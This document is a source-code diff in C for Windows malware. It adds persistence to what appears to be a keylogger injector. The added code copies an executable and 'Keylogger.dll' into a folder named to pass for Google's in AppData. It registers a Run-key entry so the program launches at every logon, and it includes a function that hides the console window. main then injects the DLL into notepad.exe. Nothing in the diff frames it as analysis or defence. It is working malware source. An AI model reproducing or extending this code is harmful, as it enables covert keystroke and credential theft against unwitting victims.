@@ -37,7 +37,97 @@ void cleanup(PROCESS_INFORMATION *ProcessInfo) {
     CloseHandle(ProcessInfo->hProcess);
 }
 
+void create_directory(char *targetPath) {
+    if (!targetPath) return;
+    
+    struct stat st = {0};
+    if (stat(targetPath, &st) == -1) {
+        if (_mkdir(targetPath) == 0) {
+            printf("Directory created successfully: %s\n", targetPath);
+        } else {
+            perror("Failed to create directory");
+        }
+    } else {
+        printf("Directory already exists: %s\n", targetPath);
+    }
+}
+
+void copyToSystemLocation(char *targetPath) {
+    if (!targetPath) return;
+    
+    char username[256];
+    DWORD username_len = sizeof(username);
+
+    if (!GetUserName(username, &username_len)) {
+        printf("Failed to get username. Error code: %lu\n", GetLastError());
+        return;
+    }
+   
+    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services", username) >= MAX_PATH) {
+        printf("Path length exceeds MAX_PATH limit.\n");
+        return;
+    }
+
+    create_directory(targetPath);
+
+    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWFILE) >= MAX_PATH) {
+        printf("Path length exceeds MAX_PATH limit.\n");
+        return;
+    }
+
+    if (access(targetPath, F_OK) != -1) {
+        printf("File already exists at target location: %s\n", targetPath);
+    } else if (!CopyFile(OLDFILE, targetPath, FALSE)) {
+        printf("Error copying file. Error code: %lu\n", GetLastError());
+    } else {
+        printf("File copied successfully to: %s\n", targetPath);
+    }
+
+    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWDLL) >= MAX_PATH) {
+        printf("Path length exceeds MAX_PATH limit.\n");
+        return;
+    }
+
+    if (access(targetPath, F_OK) != -1) {
+        printf("DLL already exists at target location: %s\n", targetPath);
+    } else if (!CopyFile(OLDDLL, targetPath, FALSE)) {
+        printf("Error copying DLL. Error code: %lu\n", GetLastError());
+    } else {
+        printf("DLL copied successfully to: %s\n", targetPath);
+    }
+}
+
+void setRegistryPersistence(const char *targetPath) {
+    if (!targetPath) return;
+    
+    HKEY hKey;
+    LONG result = RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+    if (result == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, REGISTERY_NAME, 0, REG_SZ, (LPBYTE)targetPath, (DWORD)(strlen(targetPath) + 1));
+        RegCloseKey(hKey);
+        printf("Registry persistence set for: %s\n", targetPath);
+    } else {
+        printf("Failed to open registry key. Error code: %lu\n", GetLastError());
+    }
+}
+
+void persistence() {
+    char targetPath[MAX_PATH];
+    copyToSystemLocation(targetPath); 
+    setRegistryPersistence(targetPath); 
+}
+
+void hideConsole() {
+    HWND stealth = GetConsoleWindow();
+    ShowWindow(stealth, SW_HIDE);
+}
+
+
 int main() {
+
+    // hideConsole();
+    persistence();
+
     PROCESS_INFORMATION ProcessInfo = { 0 };
     LPCSTR targetPath = "C:\\Windows\\System32\\notepad.exe";
     LPCSTR libraryPath = "Keylogger.dll";
